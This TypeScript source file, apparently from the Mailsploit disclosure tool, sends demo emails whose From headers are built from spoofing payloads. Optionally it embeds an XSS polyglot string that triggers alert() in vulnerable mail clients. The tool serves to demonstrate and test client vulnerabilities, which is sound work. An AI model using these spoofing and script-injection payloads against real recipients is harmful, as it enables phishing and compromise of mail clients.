/*
 * Mailsploit Server
 * Copyright (C) 2018 Sabri Haddouche
 */

import * as nodeMailer from 'nodemailer';
import * as SMTPTransport from 'nodemailer/lib/smtp-transport';
import {PayloadDirectory} from './Payloads';
import {Config} from './Config';

export class Dispatcher {
  private transporter;

  private static isEmail(email: string) {
    return /^([^\x00-\x20\x22\x28\x29\x2c\x2e\x3a-\x3c\x3e\x40\x5b-\x5d\x7f-\xff]+|\x22([^\x0d\x22\x5c\x80-\xff]|\x5c[\x00-\x7f])*\x22)(\x2e([^\x00-\x20\x22\x28\x29\x2c\x2e\x3a-\x3c\x3e\x40\x5b-\x5d\x7f-\xff]+|\x22([^\x0d\x22\x5c\x80-\xff]|\x5c[\x00-\x7f])*\x22))*\x40([^\x00-\x20\x22\x28\x29\x2c\x2e\x3a-\x3c\x3e\x40\x5b-\x5d\x7f-\xff]+|\x5b([^\x0d\x5b-\x5d\x80-\xff]|\x5c[\x00-\x7f])*\x5d)(\x2e([^\x00-\x20\x22\x28\x29\x2c\x2e\x3a-\x3c\x3e\x40\x5b-\x5d\x7f-\xff]+|\x5b([^\x0d\x5b-\x5d\x80-\xff]|\x5c[\x00-\x7f])*\x5d))*$/.test(
      email,
    );
  }

  constructor(private username: string, private password: string) {
    this.transporter = nodeMailer.createTransport({
      host: 'email-smtp.eu-west-1.amazonaws.com',
      port: 465,
      secure: true,
      auth: {
        user: this.username,
        pass: this.password,
      },
      // Pool
      pool: true,
      rateLimit: 14,
    });
  }

  private _dispatch(options: nodeMailer.SendMailOptions): void {
    console.log('Dispatching email...');
    this.transporter.sendMail(options, (error, info) => {
      if (error) {
        return console.log(JSON.stringify(error));
      }
      console.log('Email has been dispatched');
      return console.log(JSON.stringify(info));
    });
  }

  public async dispatch(email: string, options: Array<number>, xss: string): Promise<void> {
    console.log(`Dispatching a demo to %s with options: %o`, email, options);

    // Check email
    if (!Dispatcher.isEmail(email)) {
      throw new Error('Provided email is invalid.');
    }

    // Dispatch email(s)
    for (const option of options) {
      if (typeof option !== 'string' || typeof PayloadDirectory[option] === 'undefined') {
        console.log('Non-existant payload detected.');
        continue;
      }

      // Polyglot asked?
      if (typeof xss === 'string' && xss === 'true' && PayloadDirectory[option].generic !== true) {
        const payload = PayloadDirectory[option].build(
          `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e`,
        );
        console.log(payload.length);
        if (payload.length <= 320) {
          this._dispatch({
            from: payload,
            html: Config.Dispatcher.htmlBodyXSS,
            subject: `Mailsploit: ${PayloadDirectory[option].name}${
              typeof PayloadDirectory[option].representation === 'string'
                ? ` (XSS polyglot via ${PayloadDirectory[option].representation})`
                : ' (XSS polyglot)'
            }`,
            text: Config.Dispatcher.plaintextBodyXSS,
            to: email,
          });
        } else {
          console.log(`Did not sent XSS for option ${option} because the payload is more than 320 bytes.`);
        }
      }
      this._dispatch({
        from: PayloadDirectory[option].build(Config.Dispatcher.from),
        replyTo: Config.Dispatcher.from,
        html: !PayloadDirectory[option].generic ? Config.Dispatcher.htmlBody : Config.Dispatcher.htmlBodyGeneric,
        subject: `Mailsploit: ${PayloadDirectory[option].name}${
          typeof PayloadDirectory[option].representation === 'string' && !PayloadDirectory[option].generic
            ? ` (via ${PayloadDirectory[option].representation})`
            : ''
        }`,
        text: !PayloadDirectory[option].generic
          ? Config.Dispatcher.plaintextBody
          : Config.Dispatcher.plaintextBodyGeneric,
        to: email,
      });
    }
  }
}
